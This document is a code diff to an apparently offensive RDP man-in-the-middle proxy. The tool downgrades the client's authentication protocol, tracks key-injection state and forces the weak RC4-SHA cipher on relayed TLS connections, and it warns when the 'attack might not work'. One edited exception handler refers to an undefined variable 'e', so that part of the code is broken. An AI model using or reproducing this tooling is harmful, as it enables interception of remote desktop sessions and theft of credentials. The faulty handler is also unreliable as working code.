@@ -4,6 +4,7 @@ import threading
 import select
 import re
 import os
+import subprocess
 import time
 from binascii import hexlify, unhexlify
 from base64 import b64encode
@@ -24,6 +25,12 @@ class RDPProxy(threading.Thread):
         self.vars = {}
         self.injection_key_count = -100
         self.keyinjection_started = False
+
+        if b"RC4-SHA" in subprocess.check_output('openssl ciphers'.split()):
+            self.rc4 = True
+        else:
+            print("Warning: RC4 not available on client, attack might not work")
+            self.rc4 = False
 
         #  self.relay_proxy = None
         #  if args.relay: # TODO
@@ -96,6 +103,10 @@ class RDPProxy(threading.Thread):
 
     def handle_protocol_negotiation(self):
         data = self.lsock.recv(4096)
+        if not data:
+            print('No data returned')
+            self.cancelled = True
+            return None
         dump_data(data, From="Client")
         self.save_vars({"RDP_PROTOCOL_OLD":  data[-4]})
         data = downgrade_auth(data)
@@ -129,17 +140,21 @@ class RDPProxy(threading.Thread):
                 certfile=args.certfile,
                 ssl_version=sslversion,
             )
-            try:
-                self.rsock = ssl.wrap_socket(self.rsock, ciphers="RC4-SHA")
-            except ssl.SSLError as e:
-                print("Not using RC4-SHA because of SSL Error:", str(e))
+            if self.rc4:
+                try:
+                    self.rsock = ssl.wrap_socket(self.rsock, ciphers="RC4-SHA")
+                except ssl.SSLError:
+                    print("Not using RC4-SHA because of SSL Error:", str(e))
+                    self.rsock = ssl.wrap_socket(self.rsock, ciphers=None)
+            else:
                 self.rsock = ssl.wrap_socket(self.rsock, ciphers=None)
         except ConnectionResetError:
             print("Connection lost")
         except ssl.SSLEOFError:
             print("SSL EOF Error during handshake")
-        except AttributeError:
+        except AttributeError as e:
             # happens when there is no rsock, i.e. fake_server==True
+            print(e)
             pass
 
 
